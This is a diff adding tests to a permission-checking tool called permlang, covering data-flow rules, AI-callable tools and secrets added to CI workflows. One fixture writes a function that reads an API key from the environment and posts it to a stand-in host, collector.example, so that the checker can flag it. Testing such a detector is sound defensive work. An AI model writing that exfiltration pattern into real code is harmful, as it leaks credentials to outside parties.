@@ -106,6 +106,69 @@ describe("configuration errors", () => {
   });
 });
 
+describe("data-flow rules", () => {
+  it("fails a function that can send a protected secret to another host", () => {
+    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)", to: ["net(api.example.com)"] }] }));
+    // This temporary repository has no node_modules: just enough of @types/node for process.env.
+    writeFileSync(
+      path.join(dir, "my lib", "node.d.ts"),
+      "declare namespace NodeJS { interface ProcessEnv { [key: string]: string | undefined } }\ndeclare var process: { env: NodeJS.ProcessEnv };\n",
+    );
+    writeFileSync(
+      path.join(dir, "my lib", "leak.ts"),
+      "export async function leak() {\n  const key = process.env.API_KEY;\n  await fetch(\"https://collector.example/k\", { body: key });\n}\n",
+    );
+    const { code, out } = permlang("check", "my lib", "--no-lock", "--strictness", "sketch");
+    expect(code).toBe(0);
+    expect(out).toContain("my lib/leak.ts:3:9 warning PERM009: leak reads env(API_KEY) and can send to net(collector.example)");
+    expect(permlang("check", "my lib", "--no-lock").out).toContain("error PERM009");
+  });
+
+  it("rejects a malformed rule", () => {
+    writeFileSync(path.join(dir, "permlang.config.json"), JSON.stringify({ flows: [{ from: "env(API_KEY)" }] }));
+    const { code, out } = permlang("check", "my lib", "--no-lock");
+    expect(code).toBe(2);
+    expect(out).toContain('flows[0]: "to" must be a list of capabilities');
+  });
+});
+
+describe("tools given to AI models", () => {
+  it("warns about a tool a model can point anywhere, and marks its new access in the comment", () => {
+    writeFileSync(path.join(dir, "my lib", "ai.d.ts"), 'declare module "ai" { export function tool<T>(definition: T): T; }\n');
+    expect(permlang("init", "my lib").code).toBe(0);
+    git("add", "-A");
+    git("commit", "-q", "-m", "base");
+    writeFileSync(
+      path.join(dir, "my lib", "tools.ts"),
+      'import { tool } from "ai";\nexport const browse = tool({ description: "Fetch a page", execute: async ({ url }: { url: string }) => fetch(url) });\n',
+    );
+
+    const check = permlang("check", "my lib", "--strictness", "sketch");
+    expect(check.out).toContain("my lib/tools.ts:2:23 warning PERM008: tool browse (ai) can be called by an AI model, and reaches net.");
+    expect(check.out).toContain("1 tool an AI model can call:\n  my lib/tools.ts:2 browse (ai): net");
+    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
+    expect(md).toMatch(/<code>\+ net<\/code> \|.*⚠️ An AI model can trigger this, through <code>browse<\/code><\/sub> \|/);
+  });
+});
+
+describe("project configuration", () => {
+  it("fails a change that adds a secret to a workflow, and shows it in the comment", () => {
+    const workflow = path.join(dir, ".github", "workflows", "ci.yml");
+    mkdirSync(path.dirname(workflow), { recursive: true });
+    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n");
+    expect(permlang("init", "my lib").code).toBe(0);
+    git("add", "-A");
+    git("commit", "-q", "-m", "base");
+    writeFileSync(workflow, "on: [pull_request]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n        env:\n          TOKEN: ${{ secrets.DEPLOY_KEY }}\n");
+
+    const check = permlang("check", "my lib");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain(".github/workflows/ci.yml:10:18 error PERM005: .github/workflows/ci.yml now grants ci.secret(DEPLOY_KEY)");
+    const md = permlang("diff", "HEAD", "my lib", "--format", "markdown").out;
+    expect(md).toContain("<code>+ ci.secret(DEPLOY&#95;KEY)</code> | <code>&lt;ci.yml&gt;</code><br><sub>secrets.DEPLOY&#95;KEY</sub>");
+  });
+});
+
 describe("permlang diff: new dependencies", () => {
   it("lists packages the change adds, what PermLang knows about them, and their install scripts", () => {
     writeFileSync(path.join(dir, "package.json"), JSON.stringify({ dependencies: { zod: "^3.0.0" } }));
